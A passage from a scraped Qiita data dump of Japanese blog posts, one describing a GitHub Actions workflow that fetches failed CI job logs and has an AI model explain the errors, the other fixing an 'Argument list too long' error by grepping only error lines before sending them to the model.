原因\nエラー分析を行う際のログが膨大だった。\nAI分析する前に、対象のログを全て取得していたため、ログの容量が大きい場合は全て取得できずにエラーとなっていました。\n\n# 解決方法\nログからエラーメッセージのみをgrepして出力する。\nエラーログを取得する処理を全量取得から、errorとして出力しているものをgrepして取得することで、ログの容量を減らしました。\n\nまた、promptの書き方も簡潔にしました。\n\n```diff_yaml\n      - name: Get error info\n        id: get-error\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          # ワークフローの実行IDを取得\n          RUN_ID=${{ github.event.workflow_run.id }}\n          echo \"RUN_ID: $RUN_ID\"\n          # ワークフロー情報を環境変数に保存\n          echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" >> $GITHUB_ENV\n          echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" >> $GITHUB_ENV\n          echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" >> $GITHUB_ENV\n\n          # ジョブの一覧を取得\n          JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')\n\n          # 失敗したジョブのログを取得\n          echo \"FAILED_LOGS<<EOF\" >> $GITHUB_ENV\n\n          for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do\n-           echo \"=== Job ID: $job ===\" >> $GITHUB_ENVAdd commentMore actions\n-           gh api repos/${{ github.repository }}/actions/jobs/${job}/logs >> $GITHUB_ENV 2>&1 || echo \"ログの取得に失敗しました\" >> $GITHUB_ENV\n            # ジョブ名を取得\n+            JOB_NAME=$(echo \"$JOBS\" | jq -r --arg id \"$job\" '.[] | select(.id == ($id | tonumber)) | .name')\n+            echo \"失敗したジョブ: $JOB_NAME\" >> $GITHUB_ENV\n+            echo \"\" >> $GITHUB_ENV\n            \n+            # エラーの部分だけを取得（最大30行）\n+           echo \"エラー内容:\" >> $GITHUB_ENV\n+            gh api repos/${{ github.repository }}/actions/jobs/${job}/logs 2>&1 | \\\n+              grep -B 2 -A 5 -i \"error\\|fail\\|Found multiple\\|Expected\\|Received\" | \\\n+              head -30 >> $GITHUB_ENV || echo \"ログを取得できませんでした\" >> $GITHUB_ENV\n            \n            echo \"\" >> $GITHUB_ENV\n+            echo \"---\" >> $GITHUB_ENV\n          done\n\n          echo \"EOF\" >> $GITHUB_ENV\n\n      - name: Run AI check\n        id: ai-check\n        uses: actions/ai-inference@v1\n        with:\n          model: \"openai/gpt-4o\"\n          prompt: |\n-            あなたは、GitHub ActionsとJavaScript/TypeScriptのテストのプロです。\n+            あなたは、GitHub ActionsとJavaScript/TypeScriptのテストのプロです。\n           初心者でも理解できるように\n            以下の形式で簡潔に（全体で10行以内）説明してください。\n            エラーの内容は以下です。\n\n            **失敗したワークフロー:**\n            - ワークフロー名: ${{ env.WORKFLOW_NAME }}\n            - ブランチ: ${{ env.BRANCH_NAME }}\n            - コミットSHA: ${{ env.COMMIT_SHA }}\n            - 使用技術: Vite, Supabase, Firebase\n\n            **エラーログ:**\n            ```\n            ${{ env.FAILED_LOGS }}\n            ```\n\n            **回答形式フォーマット:**\n            【原因】1-2行で説明\n            【解決方法】具体的な手順を1-2個\n            【予防策】1つだけ\n\n      - name: Save AI response to summary\n        if: always()\n        run: |\n          # GitHub Actionsのサマリーに出力（Web UIで確認可能）\n          echo \"## 分析結果\" >> $GITHUB_STEP_SUMMARY\n          echo \"\" >> $GITHUB_STEP_SUMMARY\n          echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d >> $GITHUB_STEP_SUMMARY\n\n```\n\n# おわりに\npromptの一行を変えるだけで、結果が大きく変わることに驚きました。AIの指示の出し方もスキルとして必要なのではと思うエラーでした。\n\n","coediting":false,"comments_count":0,"created_at":"2025-06-04T23:11:25+09:00","group":null,"id":"adc4a8e7782e89d4d524","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"GitHubActions","versions":[]}],"title":"【GitHub Acrions】Argument list too longエラーが発生する","updated_at":"2025-06-04T23:11:25+09:00","url":"https://qiita.com/asa129/items/adc4a8e7782e89d4d524","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":367,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-4:219\">GitHub ActionsでCI/CDを実現できるようになった今、pushする度にワークフローがエラーとなることが多々あります。<br>\nエラーが起きる度に原因を調べたり、AIに聞いたりしていたのですが、段々と面倒になってると感じていました。<br>\nそこで、GitHub Actionsの<code>ai-inference</code>を使用して、エラーの原因と解消方法を自動で教えてもらうことはできないかと考え、AIと相談しながら実際に作成してみました。</p>\n<p data-sourcepos=\"6:1-6:39\"><iframe id=\"qiita-embed-content__ae6b8c545127f5204ea30893c1005564\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__ae6b8c545127f5204ea30893c1005564\" data-content=\"https%3A%2F%2Fgithub.com%2Factions%2Fai-inference\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"8:1-8:32\">\n<span id=\"作成したワークフロー\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC\"><i class=\"fa fa-link\"></i></a>作成したワークフロー</h1>\n<p data-sourcepos=\"10:1-10:199\">CI/CDワークフロー（test-deploy.yml）が失敗した際に、エラーログを取得し、AIが自動で解析、ジョブの概要欄にて原因と解決方法を表示してくれます。</p>\n<p data-sourcepos=\"12:1-12:85\"><iframe id=\"qiita-embed-content__f0bde74e7edd85136ff0fdc0d3e95332\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f0bde74e7edd85136ff0fdc0d3e95332\" data-content=\"https%3A%2F%2Fgithub.com%2Fasa129%2Faddiless-alcohol-app%2Factions%2Fworkflows%2Fai-failure-check.yml\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<details><summary><b>ai-failure-check.yml</b></summary>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"16:1-113:3\">\n<div class=\"code-lang\"><span class=\"bold\">ai-failure-check.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">AI Failure check</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">workflow_run</span><span class=\"pi\">:</span>\n    <span class=\"na\">workflows</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">Test</span><span class=\"nv\"> </span><span class=\"s\">and</span><span class=\"nv\"> </span><span class=\"s\">Deploy\"</span>\n    <span class=\"na\">types</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">completed</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">on-success</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">${{ github.event.workflow_run.conclusion == 'success' }}</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">success</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow success\"</span>\n  <span class=\"na\">on-failure</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">${{ github.event.workflow_run.conclusion == 'failure' }}</span>\n    <span class=\"na\">permissions</span><span class=\"pi\">:</span>\n      <span class=\"na\">actions</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n      <span class=\"na\">contents</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n      <span class=\"na\">models</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">failure</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow failed\"</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v4</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Get error info</span>\n        <span class=\"na\">id</span><span class=\"pi\">:</span> <span class=\"s\">get-error</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">GITHUB_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.GITHUB_TOKEN }}</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"::error::ワークフロー失敗\"</span>\n          <span class=\"s\">echo \"branch: ${{ github.event.workflow_run.head_branch }}\"</span>\n\n          <span class=\"s\"># ワークフローの実行IDを取得</span>\n          <span class=\"s\">RUN_ID=${{ github.event.workflow_run.id }}</span>\n          <span class=\"s\">echo \"RUN_ID: $RUN_ID\"</span>\n\n          <span class=\"s\"># ワークフロー情報を環境変数に保存</span>\n          <span class=\"s\">echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\"># ジョブの一覧を取得</span>\n          <span class=\"s\">JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')</span>\n\n          <span class=\"s\"># 失敗したジョブのログを取得</span>\n          <span class=\"s\">echo \"FAILED_LOGS&lt;&lt;EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\">for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do</span>\n            <span class=\"s\">echo \"=== Job ID: $job ===\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">gh api repos/${{ github.repository }}/actions/jobs/${job}/logs &gt;&gt; $GITHUB_ENV 2&gt;&amp;1 || echo \"ログの取得に失敗しました\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">done</span>\n\n          <span class=\"s\">echo \"EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run AI check</span>\n        <span class=\"na\">id</span><span class=\"pi\">:</span> <span class=\"s\">ai-check</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/ai-inference@v1</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">model</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">openai/gpt-4o\"</span>\n          <span class=\"na\">prompt</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n            <span class=\"s\">あなたは、エラー解決のプロです。初心者に向けてわかりやすくなぜエラーになったのか、どうすればエラーを解決できるかを教えてください。</span>\n            <span class=\"s\">以下の形式で簡潔に（全体で10行以内）説明してください。</span>\n            <span class=\"s\">エラーの内容は以下です。</span>\n\n            <span class=\"s\">**失敗したワークフロー:**</span>\n            <span class=\"s\">- ワークフロー名: ${{ env.WORKFLOW_NAME }}</span>\n            <span class=\"s\">- ブランチ: ${{ env.BRANCH_NAME }}</span>\n            <span class=\"s\">- コミットSHA: ${{ env.COMMIT_SHA }}</span>\n            <span class=\"s\">- 使用技術: Vite, Supabase, Firebase</span>\n\n            <span class=\"s\">**エラーログ:**</span>\n            <span class=\"s\">```</span>\n            <span class=\"s\">${{ env.FAILED_LOGS }}</span>\n            <span class=\"s\">```</span>\n\n            <span class=\"s\">**回答形式フォーマット:**</span>\n            <span class=\"s\">【原因】1-2行で説明</span>\n            <span class=\"s\">【解決方法】具体的な手順を1-2個</span>\n            <span class=\"s\">【予防策】1つだけ</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Save AI response to summary</span>\n        <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">always()</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\"># GitHub Actionsのサマリーに出力（Web UIで確認可能）</span>\n          <span class=\"s\">echo \"## 分析結果\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n\n</code></pre></div>\n</div>\n</details>\n<p data-sourcepos=\"117:1-117:180\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc980ef82-f6c8-4055-b45a-2345ef1ea153.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1512eb04aabb88070a8191ae13e83396\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc980ef82-f6c8-4055-b45a-2345ef1ea153.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1512eb04aabb88070a8191ae13e83396\" alt=\"github.com_asa129_addiless-alcohol-app_actions_runs_15256956232.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc980ef82-f6c8-4055-b45a-2345ef1ea153.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d276ad706e1641644d68d94f8e74cc64 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c980ef82-f6c8-4055-b45a-2345ef1ea153.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"120:1-120:18\">\n<span id=\"実際の流れ\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E9%9A%9B%E3%81%AE%E6%B5%81%E3%82%8C\"><i class=\"fa fa-link\"></i></a>実際の流れ</h2>\n<h4 data-sourcepos=\"121:1-121:41\">\n<span id=\"ワークフローエラー発生\" class=\"fragment\"></span><a href=\"#%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC%E3%82%A8%E3%83%A9%E3%83%BC%E7%99%BA%E7%94%9F\"><i class=\"fa fa-link\"></i></a>①ワークフローエラー発生</h4>\n<p data-sourcepos=\"122:1-122:87\">test-deploy.yml実行時、project_testジョブでテストが失敗しています。</p>\n<p data-sourcepos=\"124:1-124:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9df3a0f4-643b-4cee-a2ea-964d7d7dbde7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0184fbdf3fd7146a9cc403f99213281c\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9df3a0f4-643b-4cee-a2ea-964d7d7dbde7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0184fbdf3fd7146a9cc403f99213281c\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9df3a0f4-643b-4cee-a2ea-964d7d7dbde7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1b7a2c65f44aeb2893678c028cb53cd4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9df3a0f4-643b-4cee-a2ea-964d7d7dbde7.png\" loading=\"lazy\"></a></p>\n<h4 data-sourcepos=\"126:1-126:49\">\n<span id=\"aiにてワークフローエラー解析\" class=\"fragment\"></span><a href=\"#ai%E3%81%AB%E3%81%A6%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC%E3%82%A8%E3%83%A9%E3%83%BC%E8%A7%A3%E6%9E%90\"><i class=\"fa fa-link\"></i></a>②AIにてワークフローエラー解析</h4>\n<p data-sourcepos=\"127:1-127:125\">test-deploy.yml実行後、ai-failure-check.ymlのワークフローが自動で起動、エラーログを取得します。</p>\n<h4 data-sourcepos=\"129:1-129:35\">\n<span id=\"分析した結果の表示\" class=\"fragment\"></span><a href=\"#%E5%88%86%E6%9E%90%E3%81%97%E3%81%9F%E7%B5%90%E6%9E%9C%E3%81%AE%E8%A1%A8%E7%A4%BA\"><i class=\"fa fa-link\"></i></a>③分析した結果の表示</h4>\n<p data-sourcepos=\"130:1-130:83\">AI分析した結果（原因と対処方法）が概要欄に表示されます。</p>\n<p data-sourcepos=\"132:1-132:180\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc980ef82-f6c8-4055-b45a-2345ef1ea153.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1512eb04aabb88070a8191ae13e83396\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc980ef82-f6c8-4055-b45a-2345ef1ea153.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1512eb04aabb88070a8191ae13e83396\" alt=\"github.com_asa129_addiless-alcohol-app_actions_runs_15256956232.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc980ef82-f6c8-4055-b45a-2345ef1ea153.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d276ad706e1641644d68d94f8e74cc64 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c980ef82-f6c8-4055-b45a-2345ef1ea153.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"134:1-134:17\">\n<span id=\"作成の過程\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E6%88%90%E3%81%AE%E9%81%8E%E7%A8%8B\"><i class=\"fa fa-link\"></i></a>作成の過程</h1>\n<h2 data-sourcepos=\"135:1-135:90\">\n<span id=\"1-ワークフロー実行後をトリガーとする新規ワークフローの作成\" class=\"fragment\"></span><a href=\"#1-%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC%E5%AE%9F%E8%A1%8C%E5%BE%8C%E3%82%92%E3%83%88%E3%83%AA%E3%82%AC%E3%83%BC%E3%81%A8%E3%81%99%E3%82%8B%E6%96%B0%E8%A6%8F%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>1. ワークフロー実行後をトリガーとする新規ワークフローの作成</h2>\n<p data-sourcepos=\"136:1-136:134\">ワークフローの完了をトリガーに別のワークフローを実行するために、<code>workflow_run</code>を使用しました。</p>\n<p data-sourcepos=\"138:1-138:128\"><iframe id=\"qiita-embed-content__964f524a9d756397ff841fdb4bd599b5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__964f524a9d756397ff841fdb4bd599b5\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-when-your-workflow-runs%2Fevents-that-trigger-workflows%23workflow_run\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"140:1-164:3\">\n<div class=\"code-lang\"><span class=\"bold\">ai-failure-check</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">AI Failure check</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">workflow_run</span><span class=\"pi\">:</span>\n    <span class=\"na\">workflows</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">Test</span><span class=\"nv\"> </span><span class=\"s\">and</span><span class=\"nv\"> </span><span class=\"s\">Deploy\"</span>\n    <span class=\"na\">types</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">completed</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">on-success</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">${{ github.event.workflow_run.conclusion == 'success' }}</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">success</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow success\"</span>\n  <span class=\"na\">on-failure</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">${{ github.event.workflow_run.conclusion == 'failure' }}</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">failure</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow failed\"</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"166:1-167:58\"><code>workflows</code>：トリガーにするワークフロー名<br>\n<code>types:- completed</code>：ワークフロー実行後を指定</p>\n<p data-sourcepos=\"169:1-169:103\"><code>${{ github.event.workflow_run.conclusion == 'success' }}</code>：ワークフローの実行結果を取得</p>\n<p data-sourcepos=\"171:1-171:16\"><strong>動作確認</strong></p>\n<p data-sourcepos=\"173:1-174:108\">下記の画像はtest-deploy.yml(ワークフロー名:Test and Deploy)実行後です。<br>\n<code>job名変えたよ</code>のコメントでpush後、エラーなくワークフローが完了しています。</p>\n<p data-sourcepos=\"176:1-176:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F88acd6eb-3a1f-4829-8b4b-d939379cdabd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9e780dc3a29fb77860708718a348ffeb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F88acd6eb-3a1f-4829-8b4b-d939379cdabd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9e780dc3a29fb77860708718a348ffeb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F88acd6eb-3a1f-4829-8b4b-d939379cdabd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=33171c2aba78f47ff4af55f8d25dfaf0 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/88acd6eb-3a1f-4829-8b4b-d939379cdabd.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"178:1-178:201\">その後、ai-failure-check.yml(ワークフロー名:AI Failure check)の結果を確認、Test and Deployがエラーなく完了しているため、<code>on-success</code>ジョブが実行されました。</p>\n<p data-sourcepos=\"180:1-180:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F46475b2b-3b1b-4ebb-8731-0c24432533a1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c56f10a3828a2f4e73315d577a03ea4b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F46475b2b-3b1b-4ebb-8731-0c24432533a1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c56f10a3828a2f4e73315d577a03ea4b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F46475b2b-3b1b-4ebb-8731-0c24432533a1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=fafb462b8211956db482d47cf8b84306 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/46475b2b-3b1b-4ebb-8731-0c24432533a1.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"182:1-182:66\">コンソールにもメッセージが表示されています。</p>\n<p data-sourcepos=\"184:1-184:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F120b09d9-d3ac-4855-b249-7942e87647f2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9893c7e8b206451444f0320c3ed22ca3\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F120b09d9-d3ac-4855-b249-7942e87647f2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9893c7e8b206451444f0320c3ed22ca3\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F120b09d9-d3ac-4855-b249-7942e87647f2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6bd03744000295c0f8ad3dbdc51cc62f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/120b09d9-d3ac-4855-b249-7942e87647f2.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"187:1-187:47\">\n<span id=\"2-エラーログ取得とai解析の実装\" class=\"fragment\"></span><a href=\"#2-%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%AD%E3%82%B0%E5%8F%96%E5%BE%97%E3%81%A8ai%E8%A7%A3%E6%9E%90%E3%81%AE%E5%AE%9F%E8%A3%85\"><i class=\"fa fa-link\"></i></a>2. エラーログ取得とAI解析の実装</h2>\n<p data-sourcepos=\"189:1-189:124\">1.で作成したワークフロー失敗時に実行されるジョブ(<code>on-failure</code>)にて、以下を追加しました。</p>\n<ul data-sourcepos=\"190:1-192:0\">\n<li data-sourcepos=\"190:1-190:102\">\n<code>permissions</code>：ワークフローが他のリソースなどにアクセスする際の権限設定</li>\n<li data-sourcepos=\"191:1-192:0\"><code>steps</code></li>\n</ul>\n<p data-sourcepos=\"193:1-193:25\"><code>steps</code>は以下を追加</p>\n<ol data-sourcepos=\"194:1-199:0\">\n<li data-sourcepos=\"194:1-194:57\">\n<code>failure</code>：コンソールに失敗した旨を表示</li>\n<li 